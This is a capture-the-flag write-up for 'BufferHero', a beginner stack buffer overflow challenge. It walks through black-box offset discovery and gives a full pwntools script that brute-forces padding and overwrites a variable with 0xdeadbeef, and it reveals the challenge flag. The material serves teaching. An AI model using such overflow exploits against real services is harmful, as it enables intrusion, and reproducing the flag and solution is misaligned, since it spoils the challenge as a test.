## Challenge Description

**Category**: Pwn
**Difficulty**: Easy
**Connection**: nc 139.59.162.57 6562

BufferHero is a beginner-friendly buffer overflow challenge. Your mission is to become a true superhero by demonstrating your power level and saving the city from villains.


I decided to create this challenge as a step up from my other basic buffer overflow challenges (TitanBreacher and SenpaiOverflow). While those challenges required participants to simply input a very long string to trigger a length check, BufferHero requires actually modifying a specific variable on the stack to a specific value.

This challenge introduces the concept of targeted buffer overflows, where precision matters more than just input length. Since I only provided participants with the description and connection details (no source code), they had to discover the vulnerability through dynamic analysis.

## Challenge Approach

When participants connect to the service, they're greeted with:

```
🦸‍♂️ Welcome to Buffer Hero Academy! 🦸‍♀️

🦹 A villain is attacking the city! 🦹
Quick! Enter your superhero name:
```

After entering a normal name like "SuperHacker", they would see:

```
Your hero name is: SuperHacker
😔 Your power level isn't high enough...
Power level: 0x0
```

The first important clue is seeing "Power level: 0x0" - this suggests there's a variable tracking power level, and it's being displayed in hexadecimal format.

Participants should experiment with different inputs:

1. **Testing for buffer overflow**: They should try longer and longer inputs to see if they can affect other variables
2. **Pattern analysis**: By sending pattern strings (like "AAAABBBBCCCC..."), they can determine the exact offset needed

When sending a long enough input, they'd notice the power level value changing:

```
Your hero name is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
😔 Your power level isn't high enough...
Power level: 0x42424242
```

This is the critical insight - the "B" characters (ASCII value 0x42) have overwritten the power level! Since power level is displayed in hex, participants should deduce they need to set it to a specific value.

## Exploitation Approach

Based on black-box testing, participants should determine:

1. The buffer size appears to be 32 bytes for the name
2. There may be some padding or alignment between the buffer and the power level variable
3. They need to set the power level to some special value to become a hero
4. The service seems to be a 32-bit binary (since the power level is 4 bytes)

Through trial and error or educated guessing, they might try:
- Common magic values like `0xdeadbeef` or `0xcafebabe`
- Different padding sizes between the name buffer and the power level variable

For `0xdeadbeef`, they would need to:
- Fill the 32-byte name buffer
- Add some padding bytes (the exact number needs to be determined by experimentation)
- Append the bytes for 0xdeadbeef in little-endian format: \xef\xbe\xad\xde

## Exploit Solution

Without access to the source code, participants would need to develop a solution that tries different padding sizes:

```python
#!/usr/bin/env python3
from pwn import *
import sys

# Connect to the challenge server
HOST = "139.59.162.57"
PORT = 6562

def try_exploit(padding_size):
    conn = remote(HOST, PORT)
    
    # Create the payload with three parts:
    # 1. Fill the name buffer with 'A's
    # 2. Add padding of 'B's between the buffer and target variable
    # 3. Add the target value 0xdeadbeef in little-endian format
    payload = b'A' * 32 + b'B' * padding_size + p32(0xdeadbeef)
    
    # Send the payload when prompted
    conn.recvuntil(b"Enter your superhero name: ")
    conn.sendline(payload)
    
    # Get the response
    response = conn.recvall(timeout=2)
    conn.close()
    
    # Check if we were successful
    if b"power is overwhelming" in response or b"Congratulations" in response:
        print(f"[+] Success with {padding_size} bytes of padding!")
        print(response.decode())
        return True
    return False

# Try different padding sizes
for padding in range(0, 16):
    print(f"[*] Trying with {padding} bytes of padding...")
    if try_exploit(padding):
        break
```

The key insight here is realizing that memory alignment and compiler optimizations can introduce spacing between variables on the stack. In this case, there's padding between the name buffer and the power level variable that must be accounted for.

## Expected Output

When running the correct exploit with the right padding, participants would see:

```
🦸‍♂️ Welcome to Buffer Hero Academy! 🦸‍♀️

🦹 A villain is attacking the city! 🦹
Quick! Enter your superhero name: 

Your hero name is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[padding]
💥 Your power is overwhelming! 💥

🦸 Congratulations, Buffer Hero! 🦸
Here's your flag: CMC{buff3r_h3r0_s4v3d_th3_d4y}
```

## Learning Objectives

I designed this challenge to teach several important concepts:

1. Black-box vulnerability assessment - finding buffer overflows without source code
2. Understanding stack memory layout through experimentation
3. Learning how local variables are stored in relation to each other
4. Introducing the concept of endianness in memory
5. Demonstrating how stack alignment and compiler optimizations affect memory layout
6. Developing an exploit that works across different binary versions

Unlike my previous challenges that just checked input length, this one requires more precision and understanding of how memory works. It bridges the gap between basic string length checks and more advanced exploitation techniques like return-oriented programming.

## Conclusion

BufferHero is intentionally designed to be an incremental step up from basic buffer overflows. By requiring participants to overwrite a specific variable with a specific value, it forces them to understand more about memory layout while still being accessible to beginners.

What makes this challenge particularly educational is the need to experiment with different padding sizes - teaching that real-world exploitation often requires trial and error to account for compiler and architectural differences.

If you were able to solve this challenge, you've demonstrated a solid understanding of basic buffer overflows and are ready to tackle more complex exploitation challenges! 